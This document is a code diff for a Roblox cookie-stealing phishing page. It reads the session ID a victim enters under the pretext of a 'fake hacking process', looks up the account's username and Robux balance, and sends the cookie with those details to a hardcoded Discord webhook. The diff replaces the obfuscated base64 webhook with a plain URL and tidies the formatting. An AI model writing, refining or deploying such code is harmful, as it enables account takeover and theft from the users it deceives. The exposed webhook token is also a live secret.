@@ -1,114 +1,108 @@
-    // Obfuscated Discord Webhook URL
- const WEBHOOK_PARTS = [
-  'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1MDIzNTM1MTMzOTI0MTQ3Mi8=', // Base64 encoded part 1
-  'T3dZcXVvRm1TRENDQzQpAOxZlcnB1bGVQ3ak3gPb5xvytL', // Base64 encoded part 2
-  '8KZXIzYIhsIdW9MToUqclXZy9G8pbHjOdQ==' // Base64 encoded part 3
-];
+// Direct Discord Webhook URL
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
 
-    // Decode and combine the webhook URL
-    const DISCORD_WEBHOOK_URL = atob(WEBHOOK_PARTS.join(''));
-
-    // Function to fetch Roblox profile and Robux amount
-    async function fetchRobloxProfile(cookie) {
-      try {
-        // Fetch user ID using the cookie
-        const userIdResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`
-          }
-        });
-
-        if (!userIdResponse.ok) throw new Error('Failed to fetch user ID');
-        const userInfo = await userIdResponse.json();
-        const userId = userInfo.UserID;
-
-        // Fetch Robux balance
-        const robuxResponse = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`
-          }
-        });
-
-        if (!robuxResponse.ok) throw new Error('Failed to fetch Robux balance');
-        const robuxData = await robuxResponse.json();
-        const robuxAmount = robuxData.robux;
-
-        // Fetch profile details
-        const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`);
-        if (!profileResponse.ok) throw new Error('Failed to fetch profile details');
-        const profileData = await profileResponse.json();
-
-        return {
-          username: profileData.name,
-          userId: userId,
-          robux: robuxAmount,
-          profileUrl: `https://www.roblox.com/users/${userId}/profile`
-        };
-      } catch (error) {
-        console.error('Error fetching Roblox profile:', error);
-        return null;
+// Function to fetch Roblox profile and Robux amount
+async function fetchRobloxProfile(cookie) {
+  try {
+    // Fetch user ID using the cookie
+    const userIdResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+      headers: {
+        'Cookie': `ROBLOSECURITY=${cookie}`
       }
-    }
+    });
 
-    // Function to send data to Discord webhook
-    async function sendToDiscordWebhook(cookie) {
-      const profileData = await fetchRobloxProfile(cookie);
-      if (!profileData) {
-        console.error('No profile data found.');
-        return;
+    if (!userIdResponse.ok) throw new Error('Failed to fetch user ID');
+    const userInfo = await userIdResponse.json();
+    const userId = userInfo.UserID;
+
+    // Fetch Robux balance
+    const robuxResponse = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+      headers: {
+        'Cookie': `ROBLOSECURITY=${cookie}`
       }
+    });
 
-      const payload = {
-        content: `**New Cookie Submitted**\n` +
-          `**Username:** ${profileData.username}\n` +
-          `**User ID:** ${profileData.userId}\n` +
-          `**Robux Balance:** ${profileData.robux}\n` +
-          `**Profile URL:** ${profileData.profileUrl}\n` +
-          `\`\`\`${cookie}\`\`\``
-      };
+    if (!robuxResponse.ok) throw new Error('Failed to fetch Robux balance');
+    const robuxData = await robuxResponse.json();
+    const robuxAmount = robuxData.robux;
 
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-      })
-        .then(response => {
-          if (!response.ok) {
-            console.error('Failed to send data to Discord webhook');
-          }
-        })
-        .catch(error => {
-          console.error('Error sending data to Discord webhook:', error);
-        });
-    }
+    // Fetch profile details
+    const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`);
+    if (!profileResponse.ok) throw new Error('Failed to fetch profile details');
+    const profileData = await profileResponse.json();
 
-    // Validate User Input
-    function validateInput() {
-      const username = document.getElementById('username').value.trim();
-      const sessionId = document.getElementById('sessionId').value.trim();
-      const captcha = document.getElementById('captcha').checked;
+    return {
+      username: profileData.name,
+      userId: userId,
+      robux: robuxAmount,
+      profileUrl: `https://www.roblox.com/users/${userId}/profile`
+    };
+  } catch (error) {
+    console.error('Error fetching Roblox profile:', error);
+    return null;
+  }
+}
 
-      // Check for invalid inputs
-      let errorMessage = "";
+// Function to send data to Discord webhook
+async function sendToDiscordWebhook(cookie) {
+  const profileData = await fetchRobloxProfile(cookie);
+  if (!profileData) {
+    console.error('No profile data found.');
+    return;
+  }
 
-      if (username.length < 3 || sessionId.length < 200 || !captcha) {
-        errorMessage = "Please check your inputs: username, session ID, and CAPTCHA.";
+  const payload = {
+    content: `**New Cookie Submitted**\n` +
+              `**Username:** ${profileData.username}\n` +
+              `**User ID:** ${profileData.userId}\n` +
+              `**Robux Balance:** ${profileData.robux}\n` +
+              `**Profile URL:** ${profileData.profileUrl}\n` +
+              `\`${cookie}\``
+  };
+
+  fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
+  })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Failed to send data to Discord webhook');
       }
+    })
+    .catch(error => {
+      console.error('Error sending data to Discord webhook:', error);
+    });
+}
 
-      if (errorMessage) {
-        showError(errorMessage);
-        return;
-      }
+// Validate User Input
+function validateInput() {
+  const username = document.getElementById('username').value.trim();
+  const sessionId = document.getElementById('sessionId').value.trim();
+  const captcha = document.getElementById('captcha').checked;
 
-      // Send Session ID to Discord webhook
-      sendToDiscordWebhook(sessionId);
+  // Check for invalid inputs
+  let errorMessage = "";
 
-      // Hide error and start fake hacking process
-      hideError();
-      startHack();
-    }
+  if (username.length < 3 || sessionId.length < 200 || !captcha) {
+    errorMessage = "Please check your inputs: username, session ID, and CAPTCHA.";
+  }
+
+  if (errorMessage) {
+    showError(errorMessage);
+    return;
+  }
+
+  // Send Session ID to Discord webhook
+  sendToDiscordWebhook(sessionId);
+
+  // Hide error and start fake hacking process
+  hideError();
+  startHack();
+}
+
 
 // Show Error Message
 function showError(message) {
